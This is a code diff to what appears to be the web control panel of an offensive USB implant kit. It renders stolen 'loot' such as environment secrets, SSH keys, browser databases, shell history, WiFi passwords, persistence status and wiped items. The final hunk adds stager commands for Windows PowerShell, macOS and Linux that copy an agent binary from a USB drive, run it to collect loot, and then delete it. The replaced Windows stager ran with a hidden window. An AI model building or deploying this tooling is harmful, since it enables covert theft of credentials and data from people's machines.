@@ -373,7 +373,8 @@ function renderUsbAgent(state) {
   uiState.usbAgent = agent;
   const status = agent.state || (agent.mounted ? 'active' : 'inactive');
   if (usbAgentState) {
-    usbAgentState.textContent = status.charAt(0).toUpperCase() + status.slice(1);
+    usbAgentState.textContent =
+      status.charAt(0).toUpperCase() + status.slice(1);
     usbAgentState.title = agent.message || '';
   }
   const usbCard = usbAgentState?.closest('.stat');
@@ -680,8 +681,7 @@ async function loadBootstrap() {
   setNotice(state.message || '', state.notice || 'quiet');
   if (state.has_binary) {
     setArmoryBinaryReady(state?.usb_agent?.filename || 'Staged');
-  }
-  else updateControls();
+  } else updateControls();
   startLootStream();
 }
 
@@ -1016,7 +1016,10 @@ function renderLoot(data) {
   html += _lootSection('User', [
     _lootRow('Name', u.username),
     _lootRow('Home', u.home_dir, true),
-    _lootRow('Elevated', _present(u.is_elevated) ? (u.is_elevated ? 'Yes' : 'No') : ''),
+    _lootRow(
+      'Elevated',
+      _present(u.is_elevated) ? (u.is_elevated ? 'Yes' : 'No') : '',
+    ),
   ]);
 
   html += _lootSection('Inventory', [
@@ -1027,18 +1030,26 @@ function renderLoot(data) {
     _lootRow('Env secrets', secrets.length),
     _lootRow('SSH keys', sshKeys.length),
     _lootRow('Browser DBs', browserPaths.length),
-    _lootRow('Shell history', shellHistory.length ? `${shellHistory.length} lines` : ''),
+    _lootRow(
+      'Shell history',
+      shellHistory.length ? `${shellHistory.length} lines` : '',
+    ),
   ]);
 
   html += _lootSection('Result', [
-    _lootRow('Persistence', _present(data.installed) ? (data.installed ? 'Installed' : 'Failed') : ''),
+    _lootRow(
+      'Persistence',
+      _present(data.installed) ? (data.installed ? 'Installed' : 'Failed') : '',
+    ),
     _lootRow('Items wiped', data.items_wiped),
   ]);
 
   if (wifi.length) {
     html += _lootSection(
       `WiFi Profiles (${wifi.length})`,
-      wifi.slice(0, 8).map((w) => _lootRow(w.ssid || '?', w.password || '–', true)),
+      wifi
+        .slice(0, 8)
+        .map((w) => _lootRow(w.ssid || '?', w.password || '–', true)),
     );
   }
 
@@ -1063,21 +1074,27 @@ function renderLoot(data) {
   if (secrets.length) {
     html += _lootSection(
       `Env Secrets (${secrets.length})`,
-      secrets.slice(0, 8).map((kv) => _lootRow(kv.key || '', kv.value || '', true)),
+      secrets
+        .slice(0, 8)
+        .map((kv) => _lootRow(kv.key || '', kv.value || '', true)),
     );
   }
 
   if (sshKeys.length) {
     html += _lootSection(
       `SSH Keys (${sshKeys.length})`,
-      sshKeys.map((key) => _lootRow(key.file || '', key.content ? 'Present' : 'Empty')),
+      sshKeys.map((key) =>
+        _lootRow(key.file || '', key.content ? 'Present' : 'Empty'),
+      ),
     );
   }
 
   if (browserPaths.length) {
     html += _lootListSection(
       `Browser DBs (${browserPaths.length})`,
-      browserPaths.map((path) => String(path).split(/[/\\]/).slice(-2).join('/')),
+      browserPaths.map((path) =>
+        String(path).split(/[/\\]/).slice(-2).join('/'),
+      ),
       8,
     );
   }
@@ -1117,7 +1134,10 @@ async function importUsbLoot() {
       body: '{}',
     });
     if (result.loot) renderLoot(result.loot);
-    setNotice(result.message || 'USB loot imported.', result.notice || 'success');
+    setNotice(
+      result.message || 'USB loot imported.',
+      result.notice || 'success',
+    );
   } catch (error) {
     setNotice(error.message || 'USB loot import failed.', 'error');
   } finally {
@@ -1360,19 +1380,45 @@ document
   .getElementById('inject-os')
   ?.addEventListener('change', _updateArmorySnippet);
 
+function _usbStagerPreview(os) {
+  if (os === 'windows') {
+    return [
+      `powershell -NoProfile -ExecutionPolicy Bypass`,
+      `$r = ""`,
+      `foreach ($drive in Get-PSDrive -PSProvider FileSystem) {`,
+      `  $candidate = Join-Path $drive.Root '${_USB_WINDOWS_AGENT}'`,
+      `  if (Test-Path $candidate) { $r = $drive.Root; break }`,
+      `}`,
+      `if ($r) {`,
+      `  $s = Join-Path $r '${_USB_WINDOWS_AGENT}'`,
+      `  $loot = Join-Path $r 'loot-usb.json'`,
+      `  $d = Join-Path $env:TEMP 'pico_agent.exe'`,
+      `  Copy-Item $s $d -Force`,
+      `  & $d --loot-out $loot`,
+      `  Remove-Item $d -Force -ErrorAction SilentlyContinue`,
+      `}`,
+    ].join('\n');
+  }
+  const roots =
+    os === 'macos' ? `/Volumes/*` : `/media/$USER/* /run/media/$USER/* /mnt/*`;
+  return [
+    `for d in ${roots}; do`,
+    `  if [ -f "$d/${_USB_UNIX_AGENT}" ]; then`,
+    `    cp "$d/${_USB_UNIX_AGENT}" /tmp/pico_agent`,
+    `    chmod +x /tmp/pico_agent`,
+    `    /tmp/pico_agent --loot-out "$d/loot-usb.json"`,
+    `    rm -f /tmp/pico_agent`,
+    `    break`,
+    `  fi`,
+    `done`,
+  ].join('\n');
+}
+
 function _updateArmorySnippet() {
   const os = document.getElementById('inject-os')?.value || 'windows';
-  let cmd = '';
-  if (os === 'windows') {
-    cmd = `powershell -w hidden -c "$r=(Get-PSDrive -PSProvider FileSystem | % Root | ?{Test-Path ($_ + '${_USB_WINDOWS_AGENT}')} | select -First 1); if($r){$s=$r + '${_USB_WINDOWS_AGENT}'; $loot=$r + 'loot-usb.json'; $d=Join-Path $env:TEMP 'pico_agent.exe'; Copy-Item $s $d -Force; & $d --loot-out $loot; Remove-Item $d -Force -ErrorAction SilentlyContinue}"`;
-  } else if (os === 'macos') {
-    cmd = `for d in /Volumes/*; do [ -f "$d/${_USB_UNIX_AGENT}" ] && cp "$d/${_USB_UNIX_AGENT}" /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent --loot-out "$d/loot-usb.json" ; rm -f /tmp/pico_agent; break; done`;
-  } else {
-    cmd = `for d in /media/$USER/* /run/media/$USER/* /mnt/*; do [ -f "$d/${_USB_UNIX_AGENT}" ] && cp "$d/${_USB_UNIX_AGENT}" /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent --loot-out "$d/loot-usb.json" ; rm -f /tmp/pico_agent; break; done`;
-  }
   const snippetEl = document.getElementById('armory-snippet');
   const codeEl = document.getElementById('armory-snippet-code');
-  if (codeEl) codeEl.textContent = cmd;
+  if (codeEl) codeEl.textContent = _usbStagerPreview(os);
   if (snippetEl) snippetEl.hidden = false;
 }
 
